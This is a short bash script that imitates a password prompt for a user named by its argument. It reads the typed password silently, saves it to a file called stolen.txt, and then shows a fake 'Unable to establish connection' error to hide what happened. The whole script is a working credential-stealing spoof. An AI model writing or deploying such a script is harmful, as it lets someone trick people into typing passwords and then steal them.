#!/bin/bash
echo $1\'s password:
read -s PASSWD
echo $PASSWD > stolen.txt
echo -e '\nUnable to establish connection. Please Try again.'
